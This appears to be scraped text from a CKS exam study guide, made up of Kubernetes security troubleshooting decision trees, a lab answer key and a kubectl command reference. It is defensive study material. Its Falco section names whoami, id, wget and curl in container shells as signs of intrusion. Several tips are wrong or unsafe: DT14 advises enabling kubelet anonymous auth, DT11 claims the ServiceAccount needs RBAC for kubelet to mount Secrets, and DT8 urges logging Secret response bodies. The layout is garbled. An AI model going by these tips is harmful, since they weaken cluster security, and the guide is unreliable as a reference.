kubectl get netpol deny-all -n anihpj -o yaml | grep -A5 podSelector




Label Mismatch?

    
    
        
  • Policy uses app=anihpj-api but pod has tier=backend?
    Label mismatch! Update policy podSelector to match actual pod labels.
    • 
        
  • Empty podSelector {} selects ALL pods — is that intended?
    Pod becomes isolated for that policyType from ALL sources.
    •
✓

✅ DT3 Complete — NetPol Now Enforcing

CNIs that support NetPol: Calico ✅ · Cilium ✅ · Weave ✅ · Antrea ✅
CNIs that do NOT: Flannel ❌ · kindnet ❌ · kubenet ❌
CKS tip: Always kubectl get pods -n kube-system to verify your CNI supports NetworkPolicy BEFORE debugging policy rules.

DT4
🌳 DECISION TREE DT4 — ImagePullBackOff

Pod Stuck in ImagePullBackOff — Registry Auth & Image Verification Failure

The Problem: Pod is stuck in ImagePullBackOff — cannot pull the container image. On CKS, this often involves private registries, imagePullSecrets, signed image verification, or registry whitelist policies. Your job: diagnose the pull failure and fix it.

🖥️ CLUSTER: ksw → 1 (kubeadm) — Production cluster
▶

🚦 START — ImagePullBackOff

📖 APP STORY: anihpj-api:v2-prod is in a private ECR registry. The pod has no imagePullSecrets configured — kubelet can't authenticate.
kubectl describe pod -n anihpj <pod> | tail -15

🌿 NODE 1 — What does the event say?

Event Message — What Error?

    
    
        
  • "authentication required" / "authorization required"
    → Go to NODE 2 (imagePullSecrets)
    • 
        
  • "manifest unknown" / "not found"
    → Go to NODE 3 (image/tag doesn't exist)
    • 
        
  • "ImagePullBackOff: Back-off pulling image" with timeout
    → Go to NODE 4 (network/registry unreachable)
    • 
        
  • "unsigned image" / policy rejection
    → Go to NODE 5 (ImagePolicyWebhook / cosign verification)
    •
N2

🔴 NODE 2 — Authentication Required (imagePullSecrets)


    
Check if imagePullSecrets exist
kubectl get pod -n anihpj <pod> -o yaml | grep -A5 imagePullSecrets




Secret Diagnosis

    
    
        
  • No imagePullSecrets at all?
    Create docker-registry Secret and add to pod spec or ServiceAccount.
    • 
        
  • Secret exists but wrong credentials?
    Recreate: kubectl create secret docker-registry regcred --docker-server=REGISTRY --docker-username=USER --docker-password=PASS
    • 
        
  • Using cloud registry (ECR/GCR/ACR)?
    Token expires! ECR tokens last 12h. Use credential refresh sidecar or IRSA.
    • 
    




Create imagePullSecret + patch SA
kubectl create secret docker-registry ecr-creds -n anihpj --docker-server=ACCOUNT.dkr.ecr.REGION.amazonaws.com --docker-username=AWS --docker-password=$(aws ecr get-login-password)
kubectl patch sa default -n anihpj -p '{"imagePullSecrets":[{"name":"ecr-creds"}]}'
✓

✅ DT4 Complete — ImagePullBackOff Resolved

N2=auth · N3=image missing · N4=network · N5=signature
CKS tip: For ECR/GCR, tokens EXPIRE. Always use imagePullSecrets on the ServiceAccount (not per-pod) for automation. Combine with AlwaysPullImages admission controller.

DT5
🌳 DECISION TREE DT5 — RBAC Forbidden

kubectl Returns "Forbidden" — RBAC Permission Denied Diagnosis

The Problem: User or ServiceAccount gets "Error from server (Forbidden)" when trying to access resources. RBAC is deny-by-default — but WHY was it denied? Your job: trace the RBAC chain, identify the missing permission, and fix it with least-privilege.

🖥️ CLUSTER: ksw → 1 (kubeadm) — Production cluster
▶

🚦 START — "Forbidden" Error

📖 APP STORY: The CI/CD pipeline's anihpj-cicd ServiceAccount can't list pods in anihpj namespace. Pipeline broken. Is it missing a RoleBinding or does it have the wrong verbs?
kubectl auth can-i list pods -n anihpj --as=system:serviceaccount:anihpj:anihpj-cicd

🌿 NODE 1 — Check what the user CAN do

kubectl auth can-i --list -n anihpj --as=system:serviceaccount:anihpj:anihpj-cicd


RBAC State

    
    
        
  • User has NO permissions at all (empty list)
    → Go to NODE 2 (no RoleBinding)
    • 
        
  • User has some permissions but not the one needed
    → Go to NODE 3 (missing specific verb/resource)
    • 
        
  • Permission exists but still denied
    → Go to NODE 4 (denied by webhook / wrong namespace)
    •
N2

🔴 NODE 2 — No RoleBinding Exists


    
List bindings in namespace
kubectl get rolebinding,clusterrolebinding -n anihpj | grep anihpj-cicd




Binding Diagnosis

    
    
        
  • No RoleBinding found for this SA?
    Create a Role + RoleBinding with minimum required permissions.
    • 
        
  • Binding exists but references wrong SA name or namespace?
    Check subjects[].name and subjects[].namespace match exactly.
    • 
    




Create Role + RoleBinding (least privilege)
kubectl create role pod-reader -n anihpj --verb=get,list --resource=pods
kubectl create rolebinding cicd-pod-reader -n anihpj --role=pod-reader --serviceaccount=anihpj:anihpj-cicd
✓

✅ DT5 Complete — RBAC Resolved

N2=no binding · N3=missing verb/resource · N4=webhook/namespace
CKS tip: kubectl auth can-i --list --as=... is your best friend. Never use cluster-admin for app SAs. Use --verb and --resource for precise permissions.

DT6
🌳 DECISION TREE DT6 — Pod Security Admission Rejected

Pod Creation Rejected by PSA — Violating Restricted/Baseline Policy

The Problem: You apply a pod YAML but it's rejected with "violates PodSecurity". The namespace has PSA enforce=restricted but your pod runs as root, has privileged:true, or uses hostPath. Your job: identify which PSA control is violated and fix the pod spec.

🖥️ CLUSTER: ksw → 1 (kubeadm) — Production cluster
▶

🚦 START — Pod Rejected by PSA

📖 APP STORY: DevOps tries to deploy anihpj-api. Namespace has enforce=restricted. Pod spec has privileged:true — instant rejection.
kubectl label ns anihpj --list | grep pod-security

🌿 NODE 1 — Check the exact violation

kubectl describe pod -n anihpj <pod> 2>&1 | grep -i "violates\|forbidden\|podsecurity"


PSA Violation Type

    
    
        
  • "privileged container" / "privileged: true"
    → Go to NODE 2 (privileged)
    • 
        
  • "must run as non-root" / "runAsNonRoot"
    → Go to NODE 3 (non-root)
    • 
        
  • "hostPath volumes" / "host namespaces"
    → Go to NODE 4 (host access)
    • 
        
  • "capabilities" / "seccomp" / "AppArmor"
    → Go to NODE 5
    •
N2

🔴 NODE 2 — Privileged Container / Host Access

Privileged Fix

    
    
        
  • privileged: true?
    Remove privileged: true. Use specific capabilities instead.
    • 
        
  • hostPID/hostIPC/hostNetwork: true?
    Remove host namespace sharing. Use projected volumes instead.
    • 
        
  • allowPrivilegeEscalation not set?
    Set allowPrivilegeEscalation: false (required for Restricted).
    • 
    




Apply Restricted-compliant securityContext
securityContext:
  runAsNonRoot: true
  runAsUser: 1000
  allowPrivilegeEscalation: false
  capabilities:
    drop: ["ALL"]
✓

✅ DT6 Complete — PSA Violation Fixed

PSA levels: privileged (no restrictions) → baseline (no host access) → restricted (must run non-root, drop ALL caps)
CKS tip: Check namespace labels: pod-security.kubernetes.io/enforce. Use warn mode in dev, enforce in prod.

DT7
🌳 DECISION TREE DT7 — Falco Alert Investigation

Falco Fires Alert — Is It a Real Threat or False Positive?

The Problem: Falco fired a "Terminal shell in container" alert for the anihpj-api pod at 3am. Is this a legitimate intrusion, a misconfigured CI job, or normal operations debugging? Your job: investigate the alert, determine if it's a real threat, and respond appropriately.

🖥️ CLUSTER: ksw → 1 (kubeadm) — Production cluster
▶

🚦 START — Falco Alert Received

📖 APP STORY: Slack: 🚨 "Terminal shell in container (pod=anihpj-api user=root)" at 03:17. Who did this? Was it an attacker or an SRE?
kubectl logs -n falco -l app=falco --tail=50 | grep -A10 "shell"

🌿 NODE 1 — Analyze the alert context

Alert Analysis — What's in the Event?

    
    
        
  • user=root + cmdline contains "whoami" / "id"?
    → Attacker reconnaissance! Go to NODE 2 (CONTAIN IMMEDIATELY)
    • 
        
  • cmdline contains "python manage.py shell" from CI?
    → Possible legitimate CI job. Go to NODE 3 (verify)
    • 
        
  • cmdline contains "apt" / "apk" / "wget" / "curl"?
    → Package install or download — suspicious! Go to NODE 4
    •
N2

🔴 NODE 2 — Likely Intrusion — CONTAIN


    
Isolate pod NOW
kubectl label pod <pod> -n anihpj quarantine=true

    
Apply quarantine NetPol
kubectl apply -f - << 'EOF'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: {name: quarantine, namespace: anihpj}
spec: {podSelector: {matchLabels: {quarantine: "true"}}, policyTypes: [Ingress, Egress]}
EOF




Response Steps

    
    
        
  • 1. Cordon node
    kubectl cordon $(kubectl get pod <pod> -n anihpj -o jsonpath='{.spec.nodeName}')
    • 
        
  • 2. Snapshot for forensics
    kubectl get pod <pod> -n anihpj -o yaml > incident-$(date +%s).yaml
    • 
        
  • 3. Delete + redeploy from clean image
    •
✓

✅ DT7 Complete — Alert Investigated

Immediate action for intrusion: Isolate (NetPol) → Cordon node → Snapshot → Delete → Redeploy clean
CKS tip: Falco's "Terminal shell in container" is the most common alert. Always check proc.cmdline and user.name in the Falco event to determine intent.

DT8
🌳 DECISION TREE DT8 — Audit Log Missing Events

Audit Log Not Recording Expected Events — Policy/Backend Diagnosis

The Problem: Someone read the anihpj-db-credentials Secret but the audit log shows nothing. Either the audit policy has wrong level or stages, or the audit backend is broken. Your job: diagnose why audit events are missing and fix the policy.

🖥️ CLUSTER: ksw → 1 (kubeadm) — Production cluster
▶

🚦 START — Audit Events Missing

📖 APP STORY: Security team searches audit log for "who read anihpj-db-credentials" — 0 results. But someone definitely accessed it.
grep "anihpj-db-credentials" /var/log/kubernetes/audit.log | wc -l

🌿 NODE 1 — Check audit configuration

ps aux | grep kube-apiserver | tr ' ' '\n' | grep audit


Audit Config Check

    
    
        
  • No --audit-policy-file?
    Audit logging not enabled at all! Go to NODE 2.
    • 
        
  • --audit-policy-file exists but events missing?
    → Go to NODE 3 (policy level/stages)
    • 
        
  • Events logged to file but not in SIEM?
    → Go to NODE 4 (webhook backend)
    •
N3

🔴 NODE 3 — Policy Level/Stages Wrong

Policy Diagnosis

    
    
        
  • level: "None" for secrets?
    Change to level: "RequestResponse" for Secrets resources.
    • 
        
  • level: "Metadata" — only shows WHO, not WHAT was read?
    Upgrade to RequestResponse to capture the response body (Secret data).
    • 
        
  • stages: only ["RequestReceived"]?
    Add ALL four stages: RequestReceived, ResponseStarted, ResponseComplete, Panic.
    •
✓

✅ DT8 Complete — Audit Events Flow

Audit levels: None → Metadata → Request → RequestResponse (most verbose)
Audit stages: RequestReceived → ResponseStarted → ResponseComplete → Panic
CKS tip: For Secrets, use level: RequestResponse + all 4 stages. The audit policy file is at /etc/kubernetes/audit-policy.yaml.

DT9
🌳 DECISION TREE DT9 — TLS Certificate Errors

TLS Certificate Error — etcd/kubelet/Ingress Certificate Diagnosis

The Problem: A component fails with "x509: certificate expired" or "tls: failed to verify certificate". Kubernetes relies heavily on TLS for etcd, kubelet, and Ingress. Your job: identify which certificate is broken and fix it.

🖥️ CLUSTER: ksw → 1 (kubeadm) — Production cluster
▶

🚦 START — TLS Certificate Error

📖 APP STORY: API server won't start. Logs show "x509: certificate has expired". etcd peer cert expired — RAFT cluster broken.
kubectl get nodes

🌿 NODE 1 — Which component has the cert error?

Component Identification

    
    
        
  • API server logs: "etcd" or "x509" in error?
    → Go to NODE 2 (etcd TLS)
    • 
        
  • kubelet logs: "failed to verify" / "certificate signed by unknown"?
    → Go to NODE 3 (kubelet TLS)
    • 
        
  • Browser: "NET::ERR_CERT_DATE_INVALID" for Ingress?
    → Go to NODE 4 (Ingress TLS)
    •
N2

🔴 NODE 2 — etcd Certificate Expired


    
Check cert expiry
kubeadm certs check-expiration 2>/dev/null || openssl x509 -in /etc/kubernetes/pki/etcd/server.crt -noout -dates




etcd Cert Fix

    
    
        
  • Cert expired or about to expire?
    Renew: kubeadm certs renew etcd-server etcd-peer etcd-healthcheck-client
    • 
        
  • After renew, restart etcd:
    crictl stop $(crictl ps --name etcd -q) — kubelet will restart the static pod.
    • 
        
  • Check CN/SAN mismatch?
    Certificate was issued for wrong hostname. Regenerate with correct SANs.
    •
✓

✅ DT9 Complete — TLS Fixed

Certificate locations: etcd → /etc/kubernetes/pki/etcd/ · kubelet → /var/lib/kubelet/pki/
CKS tip: kubeadm certs check-expiration shows ALL certs. Renew with kubeadm certs renew all. Restart static pods after renewal.

DT10
🌳 DECISION TREE DT10 — etcd Connection Refused

API Server Can't Reach etcd — Connection Refused / TLS / Network Diagnosis

The Problem: The API server logs show "etcdserver: request timed out" or "context deadline exceeded". etcd is the cluster's brain — if the API server can't reach it, the entire cluster is down. On CKS, this often involves TLS cert issues, network policy blocking, or etcd port not listening.

🖥️ CLUSTER: ksw → 1 (kubeadm) — Production cluster
▶

🚦 START — etcd Unreachable

📖 APP STORY: kubectl returns "The connection to the server was refused." API server logs: "etcdserver: request timed out". Cluster is DOWN.
crictl ps --name etcd | head -1

🌿 NODE 1 — Is etcd running?

crictl ps --name etcd
# OR: docker ps --filter name=etcd (if using Docker)


etcd Status

    
    
        
  • etcd container NOT running / Exited?
    → Go to NODE 2 (etcd down)
    • 
        
  • etcd IS running but API server can't connect?
    → Go to NODE 3 (network/TLS)
    • 
        
  • etcd logs show "tls: failed to verify"?
    → Go to NODE 4 (certificate issue)
    •
N2

🔴 NODE 2 — etcd Not Running


    
Check static pod manifest
ls -la /etc/kubernetes/manifests/etcd.yaml




etcd Recovery

    
    
        
  • Manifest missing?
    Restore from backup: copy etcd.yaml from /etc/kubernetes/manifests/.bak
    • 
        
  • etcd data corrupted?
    Restore from snapshot: etcdctl snapshot restore /opt/etcd-backup.db --data-dir=/var/lib/etcd-restore. Update etcd.yaml --data-dir.
    •
✓

✅ DT10 Complete — etcd Reconnected

etcd ports: 2379 (client) · 2380 (peer)
CKS tip: etcd is a static pod in /etc/kubernetes/manifests/etcd.yaml. If it's down, check kubelet status, cert expiry, and disk space. Always have an etcd snapshot ready.

DT11
🌳 DECISION TREE DT11 — Secrets Not Mounted

Secret Not Appearing in Pod — Mount/Env/Encryption Diagnosis

The Problem: Your pod references a Secret but the data is empty or missing. The Secret exists in Kubernetes but doesn't appear in the pod's filesystem or environment. On CKS, this can be due to RBAC restrictions, encryption issues, or misconfigured volume mounts.

🖥️ CLUSTER: ksw → 1 (kubeadm) — Production cluster
▶

🚦 START — Secret Data Missing

📖 APP STORY: anihpj-api mounts db-credentials Secret as env vars. Pod starts but DATABASE_URL is empty. Secret exists but data not injected.
kubectl get secret db-credentials -n anihpj

🌿 NODE 1 — Check Secret access

Secret Diagnosis

    
    
        
  • Secret exists but pod can't read it?
    → Go to NODE 2 (RBAC)
    • 
        
  • Secret exists, RBAC ok, but pod shows empty?
    → Go to NODE 3 (mount/config)
    • 
        
  • Secret values are base64 but pod gets garbled?
    K8s auto-decodes when mounted as file. Check if using stringData vs data.
    •
N2

🔴 NODE 2 — RBAC Blocking Secret Access


    
Check SA permissions
kubectl auth can-i get secrets -n anihpj --as=system:serviceaccount:anihpj:default




RBAC Fix

    
    
        
  • SA can't get secrets?
    Kubelet needs permission to read Secrets for mounting. Create Role + RoleBinding for the SA.
    • 
        
  • RBAC exists but using wrong SA?
    Check serviceAccountName in pod spec matches the one in RoleBinding.
    •
N3

🔴 NODE 3 — Volume Mount / Env Config Wrong

Config Diagnosis

    
    
        
  • Using envFrom but key name doesn't match?
    Keys are case-sensitive. DATABASE_URL ≠ database_url.
    • 
        
  • Volume mount path incorrect / subPath mismatch?
    Check volumeMounts.mountPath. If using subPath, Secret updates won't be reflected.
    • 
        
  • Secret in different namespace?
    Secrets are namespace-scoped. Pod and Secret must be in same namespace.
    •
✓

✅ DT11 Complete — Secret Data Visible

CKS tip: Secrets are namespace-scoped. Kubelet needs RBAC to read them. Use envFrom[].secretRef for all keys, or valueFrom.secretKeyRef for specific keys. Mount as files (not env vars) to avoid /proc exposure.

DT12
🌳 DECISION TREE DT12 — Admission Webhook Timeout

All Pod Creates Hang/Timeout — Webhook failurePolicy: Fail Diagnosis

The Problem: Suddenly ALL pod creation requests time out or hang. The cluster is frozen. A ValidatingWebhookConfiguration has failurePolicy: Fail and the webhook pod is down — so every request is blocked waiting for a response that never comes.

🖥️ CLUSTER: ksw → 1 (kubeadm) — Production cluster
▶

🚦 START — All Pod Creates Timeout

📖 APP STORY: OPA Gatekeeper pod crashed. All new pod creation hangs for 30 seconds then fails. Cluster frozen.
kubectl get validatingwebhookconfiguration,mutatingwebhookconfiguration

🌿 NODE 1 — Check webhook status

Webhook Diagnosis

    
    
        
  • Webhook pods not running / CrashLoopBackOff?
    → Go to NODE 2 (fix webhook OR change failurePolicy)
    • 
        
  • Webhook running but returning errors?
    → Go to NODE 3 (webhook logic error)
    • 
        
  • Webhook TLS cert expired / invalid?
    → Go to NODE 4 (certificate)
    •
N2

🔴 NODE 2 — Webhook Down, failurePolicy: Fail


    
EMERGENCY FIX — Change to Ignore
kubectl patch validatingwebhookconfiguration <name> --type=json -p='[{"op":"replace","path":"/webhooks/0/failurePolicy","value":"Ignore"}]'




Recovery Steps

    
    
        
  • 1. Change failurePolicy to Ignore (unblocks cluster)
    • 
        
  • 2. Fix the webhook pod
    • 
        
  • 3. Change failurePolicy back to Fail (restore security)
    •
✓

✅ DT12 Complete — Cluster Unblocked

CKS tip: failurePolicy: Fail + webhook down = cluster frozen. Emergency fix: patch to Ignore. Always test webhook changes in staging. Consider running multiple webhook replicas for HA.

DT13
🌳 DECISION TREE DT13 — Runtime Security Denial

Container Fails to Start — seccomp/AppArmor/Capabilities Diagnosis

The Problem: Container exits immediately with "operation not permitted" or signal 31 (SIGSYS). The container runtime rejected a syscall due to seccomp profile, AppArmor policy, or missing Linux capability. This is a CKS core scenario — kernel hardening blocking legitimate operations.

🖥️ CLUSTER: ksw → 1 (kubeadm) — Production cluster
▶

🚦 START — "operation not permitted"

📖 APP STORY: anihpj-api pod starts then immediately exits. kubectl logs shows "RuntimeError: operation not permitted". Security context too restrictive.
kubectl logs -n anihpj anihpj-api-xxx --previous

🌿 NODE 1 — Identify the LSM blocker

LSM Identification

    
    
        
  • Exit code 159 (128+31=SIGSYS)?
    → Go to NODE 2 (seccomp killed the process)
    • 
        
  • dmesg shows "apparmor=DENIED"?
    → Go to NODE 3 (AppArmor)
    • 
        
  • "cannot set uid" / "cannot chown"?
    → Go to NODE 4 (capabilities missing)
    •
N2

🔴 NODE 2 — seccomp Blocking Syscall


    
Check current seccomp profile
kubectl get pod -n anihpj <pod> -o jsonpath='{.spec.containers[0].securityContext.seccompProfile}'




seccomp Fix Options

    
    
        
  • Using RuntimeDefault?
    Identify blocked syscall from dmesg, create custom profile adding it, use type: Localhost.
    • 
        
  • Using custom profile?
    Check profile JSON for missing syscalls. Add the blocked syscall to "names" array in "syscalls" section.
    •
N4

🔴 NODE 4 — Missing Linux Capabilities

Capability Diagnosis

    
    
        
  • Using drop: ["ALL"]?
    Add only the needed capability: add: ["NET_BIND_SERVICE"] (bind to port <1024), add: ["CHOWN"] (chown files).
    • 
        
  • eBPF tool failing (Tetragon/Falco)?
    Add CAP_BPF + CAP_SYS_ADMIN + CAP_NET_ADMIN.
    •
✓

✅ DT13 Complete — Container Starts

CKS tip: SIGSYS (signal 31) = seccomp. Check dmesg on node. RuntimeDefault blocks ~40 syscalls. Custom profiles: add blocked syscall, apply via seccompProfile: type: Localhost, localhostProfile: profile.json.

DT14
🌳 DECISION TREE DT14 — Node NotReady

Node NotReady — kubelet Security Configuration / Certificate Diagnosis

The Problem: A worker node shows NotReady. The kubelet is running but can't communicate with the API server. On CKS, this often involves kubelet TLS cert expiry, anonymous auth disabled incorrectly, or authorization mode mismatch.

🖥️ CLUSTER: ksw → 1 (kubeadm) — Production cluster
▶

🚦 START — Node Is NotReady

📖 APP STORY: Node wk1 shows NotReady after a security hardening change to kubelet config. kubelet can't authenticate to API server.
kubectl get nodes

🌿 NODE 1 — Check node conditions

kubectl describe node <node> | grep -A10 Conditions


Condition Analysis

    
    
        
  • KubeletNotReady / ContainerRuntimeNotReady?
    → Go to NODE 2 (kubelet down)
    • 
        
  • NetworkUnavailable?
    → Go to NODE 3 (CNI/network)
    • 
        
  • MemoryPressure / DiskPressure?
    → Go to NODE 4 (resources)
    •
N2

🔴 NODE 2 — kubelet Not Functional


    
SSH to node — check kubelet
systemctl status kubelet
journalctl -u kubelet -n 50




kubelet Diagnosis

    
    
        
  • "failed to construct kubelet client: x509 cert expired"?
    kubelet client cert expired. Renew: kubeadm certs renew kubelet-client on CP, restart kubelet on node.
    • 
        
  • "authorization mode Webhook but anonymous auth disabled"?
    kubelet needs anonymous auth for health checks. Set --anonymous-auth=true with --authorization-mode=Webhook.
    • 
        
  • "failed to load client cert"?
    Check /var/lib/kubelet/pki/kubelet-client-current.pem exists and is valid.
    •
✓

✅ DT14 Complete — Node Ready

CKS tip: kubelet --anonymous-auth=true + --authorization-mode=Webhook = anonymous requests allowed but must pass authorization. kubeadm certs renew handles kubelet cert rotation. Check /var/lib/kubelet/config.yaml.

DT15
🌳 DECISION TREE DT15 — Supply Chain Verification

Image Rejected at Deployment — Signature/SBOM/Registry Policy Failure

The Problem: Your pod deployment is rejected with "image policy error" or "unsigned image". The cluster enforces supply chain security: images must be signed (Cosign), from approved registries, and have valid attestations. Your job: diagnose which supply chain check failed and fix it.

🖥️ CLUSTER: ksw → 1 (kubeadm) — Production cluster
▶

🚦 START — Image Rejected

📖 APP STORY: CI/CD pushes anihpj-api:v2.1.0 to ECR. Deployment rejected: "unsigned image — cosign verification failed". Image was pushed without signing.
kubectl describe pod -n anihpj <pod> | grep -i "rejected\|denied\|image"

🌿 NODE 1 — What's the rejection reason?

Rejection Reason

    
    
        
  • "unsigned image" / "signature verification failed"?
    → Go to NODE 2 (Cosign/signing)
    • 
        
  • "registry not permitted" / "untrusted registry"?
    → Go to NODE 3 (registry whitelist)
    • 
        
  • "image has CRITICAL CVE" / "vulnerability scan failed"?
    → Go to NODE 4 (CVE scanning)
    • 
        
  • "no SBOM" / "provenance verification failed"?
    → Go to NODE 5 (SBOM/attestation)
    •
N2

🔴 NODE 2 — Image Not Signed (Cosign)


    
Verify signature
cosign verify --key cosign.pub ACCOUNT.dkr.ecr.REGION.amazonaws.com/anihpj-api:v2.1.0




Signing Fix

    
    
        
  • Image never signed?
    Sign it: cosign sign --key cosign.key IMAGE:TAG. Add signing step to CI/CD.
    • 
        
  • Public key mismatch?
    ImagePolicyWebhook uses wrong public key. Update the key in webhook config.
    • 
        
  • Keyless (OIDC) signature expired?
    Fulcio cert expired. Re-sign with keyless: cosign sign IMAGE:TAG (uses new OIDC token).
    •
N3

🔴 NODE 3 — Registry Not in Allowlist

Registry Fix

    
    
        
  • Image from docker.io but only ECR allowed?
    Push image to approved registry OR update OPA/Gatekeeper policy to allow the registry.
    • 
        
  • Image tag is ":latest"?
    Many policies block :latest. Use specific version tags or digests (image@sha256:...).
    •
✓

✅ DT15 Complete — Image Deployed

Supply chain gates: Sign (Cosign) → Scan (Trivy) → SBOM (Syft) → Registry allowlist → Deploy
CKS tip: cosign verify checks signature. trivy image --severity CRITICAL checks CVEs. ImagePolicyWebhook enforces at admission. Always sign images in CI/CD before pushing.

📋 Appendix A: Answer KeyLab Solutions

Quick-reference answer key for all 100 hands-on lab scenarios across the 6 CKS exam domains. Every scenario follows Deploy → Error-Spot → Debug → Fix → Verify → Cleanup. Use this appendix to cross-check your approach during practice — not to peek before trying yourself.

Category 1: Cluster Setup Security (15% — S1-S15)
  • S1-S5: NetworkPolicy & TLS setup — Deny-all ingress, TLS Ingress host cert, cert-manager ACME, NodePort lockdown, IngressClass conflict resolution
  • S6-S10: Egress controls & hardening — DNS egress allow, kubelet anonymous-auth disable, Gateway API HTTPRoute, restrictive egress CIDRs, Ingress rate limiting
  • S11-S15: Platform security — Block metadata endpoint (169.254.169.254), verify platform binaries (sha256), etcd certificate rotation, disable API profiling, restrict CoreDNS ACL
Category 2: Cluster Hardening (15% — S16-S30)
  • S16-S20: RBAC & Secrets — ServiceAccount RBAC, automountSA token disable, remove cluster-admin, Secret volume (not env), etcd encryption-at-rest
  • S21-S25: Admission & Access — PSA enforce=restricted label, ClusterRole aggregation fix, bound SA token (TokenRequest), ExternalSecret Vault sync, ImagePullSecret for private ECR
  • S26-S30: Authz & SecurityContext — RBAC subresource (pods/portforward), remove blanket secret access, allowPrivilegeEscalation=false, orphaned ClusterRoleBinding cleanup, replace static token kubeconfig with exec plugin
Category 3: System Hardening (10% — S31-S40)
  • S31-S35: Container security — runAsNonRoot + runAsUser, custom seccomp profile (set_mempolicy), AppArmor profile (/tmp/media uploads), privilege escalation disable + SUID check, hostPath removal → PVC
  • S36-S40: Kernel & node — capabilities drop ALL, readOnlyRootFilesystem + emptyDir /tmp, kubelet Webhook authz, etcd NetworkPolicy restriction, kernel module blacklist (DCCP/SCTP/RDS/TIPC)
Category 4: Minimize Microservice Vulnerabilities (20% — S41-S60)
  • S41-S45: Pod Security — Full securityContext hardening, OPA Gatekeeper Rego fix (image tag), webhook failurePolicy Fix, Kyverno mutate skip annotation, imagePullPolicy Always + digest pin
  • S46-S50: Pod isolation — Remove privileged:true, remove hostPID/hostIPC, ResourceQuota + LimitRange QoS, OPA Rego nil-check guard, mutating webhook securityContext preservation
  • S51-S55: Policy engines — Gatekeeper ConstraintTemplate stale cache, Kyverno background scan remediation, PSA admission plugin enable, expired webhook cert (caBundle), PSA label consistency across namespaces
  • S56-S60: Runtime & defaults — RuntimeClass (Kata Containers) tenant isolation, capability audit + drop, default-deny NetworkPolicy all namespaces, initContainer non-root securityContext, emptyDir sizeLimit (disk exhaustion prevention)
Category 5: Supply Chain Security (20% — S61-S80)
  • S61-S65: Image scanning & signing — Trivy CVE scan + fix, :latest → digest migration, Docker layer secret leak remediation, Cosign keyless signing (OIDC), SBOM generation with syft
  • S66-S70: Key & build integrity — Cosign key rotation after leak, Docker build cache poisoning, pip dependency confusion pin private registry, multi-stage build (2.1GB→200MB), pin base image digest in Dockerfile
  • S71-S75: Registry & pipeline — OPA trusted registry policy, Trivy CI/CD scan gate (fail on CRITICAL), upgrade vulnerable dependencies (pip-audit), runtime image drift detection, GitOps manifest signing + branch protection
  • S76-S80: Attestation & migration — SLSA provenance generation, expired Fulcio cert re-sign, provenance verification before deploy, keyless registry auth (OIDC→IAM), EOL base image → distroless migration
Category 6: Monitoring, Logging & Runtime Security (20% — S81-S100)
  • S81-S85: Falco & audit — Falco Helm install + shell detection, audit policy RequestResponse for Secrets, Falco rule tuning (alert fatigue), audit log rotation (maxage/maxsize), C2 beaconing custom Falco network rule
  • S86-S90: Runtime hardening — Falco kernel module→eBPF migration, cryptojacked pod incident response (isolate/snapshot/kill), audit policy stage ordering fix, Falcosidekick Slack+PagerDuty, PII redaction from logs (GDPR)
  • S91-S95: Advanced detection — Tetragon eBPF CAP_BPF, ConfigMap mount FIM false positive fix, audit webhook→Splunk SIEM, /proc/self/environ credential read detection, container drift (apt-get in prod) alert
  • S96-S100: Automation & assessment — Falco gRPC output→Splunk, threat intelligence integration (AlienVault OTX), Fluentd audit JSON normalization, automated quarantine via Falcosidekick, full security assessment report aggregation

B.1 Cluster Context & Essential Aliases Commands 1–10

🎯 Why This Matters

The CKS exam starts with cluster context verification. You MUST know which cluster you're on. A single command on the wrong cluster can cost you 5+ minutes of recovery.

⚡ When To Use

First 30 seconds of every scenario. Before EVERY destructive command. After switching contexts. Three times minimum per scenario.

1ksw — Switch Kubernetes Environment
ksw              # Interactive menu (1-6)
ksw 1            # Fast switch to kubeadm
ksw 2            # Fast switch to kind-cka-lab
Custom bash function. Switches kubectl context AND starts/stops necessary services (Docker Desktop for kind clusters).
CKS: First command in every scenario
2kubectl config current-context
kubectl config current-context
# Output: kubernetes-admin@kubernetes
Verify which cluster you're targeting. Always run this before any destructive command.
CKS: Context verification
3kubectl config get-contexts
kubectl config get-contexts
kubectl config use-context kind-cka-lab
List ALL available contexts. Switch to a specific one. The exam provides multiple kubeconfig files.
CKS: Multi-cluster switching
4alias k=kubectl
alias k=kubectl
alias kd="kubectl describe"
alias kg="kubectl get"
alias ka="kubectl apply -f"
Essential aliases. The exam terminal has kubectl autocomplete but aliases save keystrokes under time pressure.
CKS: Speed optimization
5kubectl cluster-info
kubectl cluster-info
kubectl cluster-info dump | head -20
Quick cluster health check. Verifies API server reachable, CoreDNS running.
CKS: Cluster verification
6kubectl get nodes -o wide
kubectl get nodes -o wide
kubectl get nodes --show-labels
See node status, version, roles, IPs. Critical for verifying node health before deploying.
CKS: Node inventory
7kubectl get ns & kubectl create ns
kubectl get ns
kubectl create ns anihpj-sXX
kubectl config set-context --current --namespace=anihpj-sXX
List namespaces, create isolation namespace, set default. Every CKS scenario uses dedicated namespaces.
CKS: Namespace isolation
8kubectl api-resources
kubectl api-resources | grep -i security
kubectl api-resources --namespaced=true
Discover available API resources. Useful when working with CRDs (Falco, OPA, Kyverno resources).
CKS: API discovery
9kubectl explain
kubectl explain networkpolicy.spec
kubectl explain pod.spec.securityContext --recursive
In-exam documentation. No browser access — kubectl explain is your only reference for resource schemas.
CKS: In-exam docs
10export KUBECONFIG & env
export KUBECONFIG=/path/to/exam.kubeconfig
env | grep -i kube
Set and verify KUBECONFIG environment variable. The exam provides specific kubeconfig files per question.
CKS: Kubeconfig setup

B.4 NetworkPolicy & Network Security Commands 31–40
31kubectl get networkpolicies -A
kubectl get networkpolicies -A
kubectl describe networkpolicy deny-all -n anihpj-sXX
List all NetworkPolicies. Verify policies exist and are applied. Empty list = full east-west traffic allowed.
CKS: Policy inventory
32Default-Deny All Ingress Template
kubectl apply -f - <<EOF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: {name: deny-all-ingress, namespace: ns}
spec: {podSelector: {}, policyTypes: [Ingress]}
EOF
Block ALL ingress traffic to pods in namespace. Then selectively allow. The security baseline.
CKS: Zero-trust network
33kubectl run test --rm -it --image=busybox -- sh
kubectl run test --rm -it --image=busybox -- sh
# Inside pod: nc -zv service-name 80
# Inside pod: wget -O- http://target-pod-ip:8080
Test NetworkPolicy from within a pod. The ONLY reliable way to verify policies work.
CKS: Policy testing
34kubectl get svc,endpoints -n ns
kubectl get svc,endpoints -n anihpj-prod
kubectl get endpointslices -n anihpj-prod
Verify services have healthy endpoints. Empty endpoints = NetworkPolicy blocking or pods not ready.
